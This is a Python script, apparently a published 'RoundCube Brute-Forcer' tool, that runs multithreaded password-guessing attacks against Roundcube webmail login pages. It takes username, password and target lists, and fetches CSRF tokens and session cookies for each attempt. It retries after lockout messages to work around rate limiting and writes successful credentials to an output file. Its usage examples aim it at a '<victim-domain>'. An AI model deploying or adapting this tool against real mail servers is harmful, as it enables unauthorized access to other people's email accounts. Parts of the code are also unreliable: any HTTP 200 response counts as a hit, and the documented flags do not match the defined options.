from queue import Queue
from rich  import print
from bs4   import BeautifulSoup
from urllib.parse import quote
from time import sleep
import urllib3
import random
import os
import threading
import argparse
import textwrap
import sys
import requests

#=======Queue======
BRUTE_QUEUE = Queue()

#=======Global Variables======
AGENT  = "Mozilla/5.0 (X11; Linux x86_64; rv:19.0) Gecko/20100101 Firefox/19.0"
hits = [] # For saving the good hits
stop_threads = False

#======Suppress only InsecureRequestWarning=========
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class MyParser(argparse.ArgumentParser):
    def error(self, message):
        sys.stderr.write("error: %s\n" % message)
        self.print_help()
        sys.exit(2)

# banner
def print_banner():
    banner = """ █████╗ ██████╗  █████╗ ██████╗  █████╗ ███╗   ██╗ █████╗ 
██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔══██╗████╗  ██║██╔══██╗
███████║██████╔╝███████║██║  ██║███████║██╔██╗ ██║███████║
██╔══██║██╔═══╝ ██╔══██║██║  ██║██╔══██║██║╚██╗██║██╔══██║
██║  ██║██║     ██║  ██║██████╔╝██║  ██║██║ ╚████║██║  ██║
╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝
https://www.amnafzar.net/\n"""
    print(banner)


def read_file(file_path: str) -> list:
    """
    Reads the provided file and returns a list of usernames or the password.
    """
    with open(file_path, "r") as file:
        contents = [line.strip() for line in file.readlines()]
    return contents

def get_token(url: str, cookies) -> str:
    headers = {
        "User-Agent": AGENT,
        "Cookie": f"roundcube_sessid={cookies['roundcube_sessid']}",
        "Origin": url,
        "Referer": url,
        }
    response = requests.get(url, headers=headers)
    soup = BeautifulSoup(response.content, 'html5lib')
    table = soup.find('input', attrs = {'name':'_token'})
    token = table["value"]
    return token

def get_new_session(url: str) -> str:
    headers = {
        "User-Agent": AGENT,
        "Origin": url,
        "Referer": url,
        }
    response = requests.get(url, headers=headers)
    soup = BeautifulSoup(response.content, 'html5lib')
    table = soup.find('input', attrs = {'name':'_token'})
    token = table["value"]
    cookie = response.cookies.get_dict()["roundcube_sessid"]
    return (token, cookie)

def send_login(url, username, password):
    token, cookie = get_new_session(url)
    headers = {
        "User-Agent": AGENT,
        "Cookie": f"roundcube_sessid={cookie}",
        "Origin": url,
        "Referer": url,
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": url
        }
    
    data = f"_token={token}&_task=login&_action=login&_timezone=Asia%2FTehran&_url=&_user={quote(username)}&_pass={quote(password)}"

    print('.', end='', flush=True)
    response = requests.post(url=url, headers=headers, data=data, verify=False)
    if response.status_code == 200:
        print(f"\n[bold][green][*] Hit: {username}:{password}[/green][/bold]")
        return True
    elif response.status_code == 401 and "Too many failed login attempts" in response.text:
        num = random.randint(1,4)
        print(f"\n[yellow][!] Too many failed login attempts, trying again in {num} sec..[/yellow]")
        sleep(num)
        send_login(url, username, password)
    else:
        print(".", end="", flush=True)
        return False

def brute_force():
    global stop_threads
    while not stop_threads:
        if not BRUTE_QUEUE.empty():
            # pop an item from the queue
            to_attack = BRUTE_QUEUE.get()
            result = send_login(to_attack["url"], to_attack["username"], to_attack["password"]) 
            if result == True:
                hits.append(to_attack)
                print(f"[green] {to_attack['url']}, {to_attack['username']}, {to_attack['password']}")
            else:
                continue
        else:
            break


def main():
    global stop_threads
    parser = MyParser(description="RoundCube Brute-Forcer v1.0 | @apadanasecure", formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent("""Example:
    python3 RC-Brute.py -u admin -P ~/password.txt -t https://<victim-domain>
    python3 RC-Brute.py -U ~/usernames.txt -P ~/passwords.txt -T ~/targets.txt -o ./hits.txt
    """))
    parser.add_argument("-u", "--username", help="Username to attack. Can be provided by a single username or a file of usernames.")
    parser.add_argument("-p", "--password", help="Password to start the attack. Can be provided by a single password or a file of passwords.")
    parser.add_argument("-t", "--target", help="Target URL. Can be provided by a single URL or a file of URLs.")
    parser.add_argument("-o", "--output", default="results.txt", help="Output file for saving the results.")
    parser.add_argument("-n", "--thread", default=5, type=int, help="Set brute-force threads.")
    args = parser.parse_args()
    
    # Check if Arguments were pass
    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)

    usernames  = args.username
    passwords  = args.password
    targets    = args.target
    thread     = args.thread

    # Check if file is passed for username, password and target
    if os.path.exists(args.username):
        usernames = read_file(args.username)
    if os.path.exists(args.password):
        passwords = read_file(args.password)
    if os.path.exists(args.target):
        targets = read_file(args.target)
    
    # Creating the queue for attack
    print("[blue][*] Creating queue...[/blue]")
    if type(targets) == str:
        for username in usernames:
            for password in passwords:
                combined = {
                    "url": targets,
                    "username": username,
                    "password": password
                }
                BRUTE_QUEUE.put(combined)
    else:
        for target in targets:
            for username in usernames:
                for password in passwords:
                    combined = {
                        "url": target,
                        "username": username,
                        "password": password
                    }
                    BRUTE_QUEUE.put(combined)
    
    # Creating threads
    threads = list()
    print("[blue][*] Creating threads for Brute-Forcing target(s)...[/blue]")
    try:
        for _ in range(thread):
            t = threading.Thread(target=brute_force)
            t.daemon = True
            t.start()
            threads.append(t)
        while True:
            sleep(100)

    except KeyboardInterrupt:
        print("\n[red][!] KeyboardInterrupt detected. Stopping threads...[/red]")
        stop_threads = True  # Signal threads to stop
        
        # Wait for all threads to finish
        for thread in threads:
            thread.join()
        print("\n[blue][+] All threads have been stopped.[/blue]")
        if len(hits) > 0:
            # Write results to output
            print("[blue][*] Writing hits to output..[/blue]")
            with open(args.output, "w") as output:
                for hit in hits:
                    output.write(hit["url"] + ":::" + hit["username"] + ":::" + hit["password"] + "\n")
            print("[blue][*] Done.[/blue]")
        else:
            print("")

if __name__ == "__main__":
    print_banner()
    main()